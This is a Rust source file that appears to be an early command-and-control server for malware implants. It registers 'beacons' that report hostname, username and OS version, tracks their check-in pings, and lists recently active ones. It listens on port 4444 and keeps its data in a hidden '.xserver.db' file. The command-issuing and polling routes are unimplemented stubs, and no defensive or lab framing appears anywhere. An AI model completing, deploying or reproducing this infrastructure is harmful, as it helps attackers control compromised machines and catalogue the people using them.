use axum::{
    routing::{get, post},
    Router,
    Json,
    extract::{State, Path},
    response::IntoResponse,
    http::StatusCode,
    body::Bytes,
};
use sqlx::{sqlite::SqliteConnectOptions, SqlitePool};
use std::sync::Arc;
use tower_http::trace::TraceLayer;
use tracing_subscriber::{layer::SubscriberExt, util::SubscriberInitExt};

// Application state
#[derive(Clone)]
struct AppState {
    db: SqlitePool,
}

#[derive(Debug, sqlx::FromRow, serde::Serialize)]
struct Beacon {
    id: String,
    last_seen: String,
    status: String,
    hostname: Option<String>,
    username: Option<String>,
    os_version: Option<String>,
}

#[derive(Debug)]
struct ProtocolMessage {
    version: u32,
    msg_type: u32,
    fields: std::collections::HashMap<String, String>,
}

fn parse_protocol_message(data: &str) -> Option<ProtocolMessage> {
    let mut lines = data.lines();
    let mut message = ProtocolMessage {
        version: 0,
        msg_type: 0,
        fields: std::collections::HashMap::new(),
    };

    // parse version
    if let Some(version_line) = lines.next() {
        if let Some(version_str) = version_line.strip_prefix("Version: ") {
            message.version = version_str.parse().ok()?;
        } else {
            return None;
        }
    }

    // parse type
    if let Some(type_line) = lines.next() {
        if let Some(type_str) = type_line.strip_prefix("Type: ") {
            message.msg_type = type_str.parse().ok()?;
        } else {
            return None;
        }
    }

    // parse fields
    for line in lines {
        if let Some((key, value)) = line.split_once(": ") {
            message.fields.insert(key.to_string(), value.to_string());
        }
    }

    Some(message)
}

async fn handle_init(
    State(state): State<Arc<AppState>>,
    body: Bytes,
) -> impl IntoResponse {
    let data = String::from_utf8_lossy(&body);
    tracing::info!("Received init data: {}", data);

    if let Some(message) = parse_protocol_message(&data) {
        if message.msg_type == 2 { // PROTOCOL_MSG_INIT
            let client_id = message.fields
                .get("client_id")
                .map(String::from)
                .unwrap_or_else(|| "unknown".to_string());
            let hostname = message.fields.get("hostname").cloned();
            let username = message.fields.get("username").cloned();
            let os_version = message.fields.get("os_version").cloned();

            // Create or update beacon with full information
            let result = sqlx::query(
                "INSERT INTO beacons (id, last_seen, status, hostname, username, os_version)
                 VALUES (?, datetime('now'), 'active', ?, ?, ?)
                 ON CONFLICT(id) DO UPDATE SET
                 last_seen = datetime('now'),
                 status = 'active',
                 hostname = excluded.hostname,
                 username = excluded.username,
                 os_version = excluded.os_version"
            )
            .bind(client_id)
            .bind(hostname)
            .bind(username)
            .bind(os_version)
            .execute(&state.db)
            .await;

            match result {
                Ok(_) => (StatusCode::OK, "OK\n"),
                Err(e) => {
                    tracing::error!("Database error: {}", e);
                    (StatusCode::INTERNAL_SERVER_ERROR, "Internal Server Error\n")
                }
            }
        } else {
            (StatusCode::BAD_REQUEST, "Invalid message type\n")
        }
    } else {
        (StatusCode::BAD_REQUEST, "Invalid protocol format\n")
    }
}

async fn handle_ping(
    State(state): State<Arc<AppState>>,
    body: Bytes,
) -> impl IntoResponse {
    let data = String::from_utf8_lossy(&body);
    tracing::info!("Received ping data: {}", data);

    if let Some(message) = parse_protocol_message(&data) {
        if message.msg_type == 1 { // PROTOCOL_MSG_PING
            let client_id = message.fields
                .get("client_id")
                .map(String::from)
                .unwrap_or_else(|| "unknown".to_string());

            // Update last_seen time
            let result = sqlx::query(
                "UPDATE beacons
                 SET last_seen = datetime('now'), status = 'active'
                 WHERE id = ?"
            )
            .bind(client_id)
            .execute(&state.db)
            .await;

            match result {
                Ok(_) => (StatusCode::OK, "OK\n"),
                Err(e) => {
                    tracing::error!("Database error: {}", e);
                    (StatusCode::INTERNAL_SERVER_ERROR, "Internal Server Error\n")
                }
            }
        } else {
            (StatusCode::BAD_REQUEST, "Invalid message type\n")
        }
    } else {
        (StatusCode::BAD_REQUEST, "Invalid protocol format\n")
    }
}

async fn list_beacons(
    State(state): State<Arc<AppState>>,
) -> impl IntoResponse {
    match sqlx::query_as::<_, Beacon>(
        "SELECT
          id,
          datetime(last_seen) as last_seen,
          status,
          hostname,
          username,
          os_version
         FROM
           beacons
         WHERE
           last_seen > datetime('now', '-5 minutes')
         ORDER BY
           last_seen DESC"
    )
    .fetch_all(&state.db)
    .await
    {
        Ok(beacons) => {
            (StatusCode::OK, Json(beacons))
        }
        Err(e) => {
            tracing::error!("Database error: {}", e);
            (StatusCode::INTERNAL_SERVER_ERROR, Json(vec![]))
        }
    }
}

async fn setup_database() -> Result<SqlitePool, sqlx::Error> {
    let options = SqliteConnectOptions::new()
        .filename(".xserver.db")
        .create_if_missing(true)
        .journal_mode(sqlx::sqlite::SqliteJournalMode::Wal)
        .synchronous(sqlx::sqlite::SqliteSynchronous::Normal)
        .foreign_keys(true);

    SqlitePool::connect_with(options).await
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    // Initialize tracing
    tracing_subscriber::registry()
        .with(tracing_subscriber::EnvFilter::new(
            std::env::var("RUST_LOG").unwrap_or_else(|_| "info".into()),
        ))
        .with(tracing_subscriber::fmt::layer())
        .init();

    // Setup database
    let db = setup_database().await?;

    // Run migrations
    sqlx::migrate!("./migrations").run(&db).await?;

    // Create app state
    let state = Arc::new(AppState { db });

    // Build our application with routes
    let app = Router::new()
        .route("/", post(handle_ping))
        .route("/beacons", get(list_beacons))
        .route("/beacon/init", post(handle_init))
        .route("/beacon/poll/:id", get(poll_beacon))
        .route("/command/new", post(new_command))
        .route("/command/list", get(list_commands))
        .layer(TraceLayer::new_for_http())
        .with_state(state);

    // Run it
    let listener = tokio::net::TcpListener::bind("127.0.0.1:4444").await?;
    tracing::info!("listening on {}", listener.local_addr()?);
    axum::serve(listener, app).await?;

    Ok(())
}

// Other handler stubs remain the same...
async fn register_beacon() -> Json<String> {
    Json("Not implemented".to_string())
}

async fn poll_beacon() -> Json<String> {
    Json("Not implemented".to_string())
}

async fn new_command() -> Json<String> {
    Json("Not implemented".to_string())
}

async fn list_commands() -> Json<String> {
    Json("Not implemented".to_string())
}
